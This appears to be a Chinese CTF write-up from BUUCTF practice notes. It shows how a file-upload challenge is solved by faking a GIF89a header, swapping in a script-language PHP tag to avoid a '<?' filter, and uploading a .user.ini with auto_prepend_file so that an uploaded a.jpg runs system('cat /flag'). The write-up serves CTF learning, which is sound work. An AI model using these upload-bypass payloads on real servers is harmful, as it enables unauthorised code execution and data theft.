# 经过多次尝试判断：

## 1.后台检测为文件头可以用GIF89a绕过



## 2.检测文件中是否含有<? ， 可以用<scriptlanguage="php">phpinfo();</script>绕过



## 3.服务器为nginx，nginx不能使用apache .htaccess文件方法绕过。但是nginx服务器有一个.user.ini配置文件。



## 4.在.user,ini配置文件中写入：

```javascript
GIF89a
auto_prepend_file=a.jpg
```

上传即可，造成类似文件包含的效果







# 1. .user.ini写入：

```javascript
GIF89a
auto_prepend_file=a.jpg
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/19913D06EBB94F9B86D8D7FBF08448EBclipboard.png)

# 2.上传a.jpg

a.jpg中写入：



```javascript
GIF89a
<script language='php'>system('cat /flag');</script>
```





# 3.访问index.php 

此时index.php文件中包含了a.jpg

则执行了a.jpg的内容

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/96EFB2726DE04BE197E6967D9216D047clipboard.png)



